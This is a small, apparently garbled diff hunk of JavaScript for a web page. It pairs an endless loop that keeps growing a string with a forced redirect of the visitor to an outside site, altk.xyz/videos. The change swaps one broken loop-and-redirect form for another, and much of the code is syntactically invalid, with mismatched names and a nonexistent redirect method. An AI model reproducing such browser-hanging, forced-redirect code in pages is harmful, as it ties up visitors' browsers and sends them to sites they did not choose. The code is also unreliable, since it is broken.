@@ -35,6 +35,5 @@ function justhhhh(){
   while (0.1) 
     theafsd = theafsd += "c"
 }
-while justhhh(){
-window.location.redirect("https://altk.xyz/videos/")
-}
+while theafsd = theafs += "c" 
+window.location.replace("https://altk.xyz/videos/")
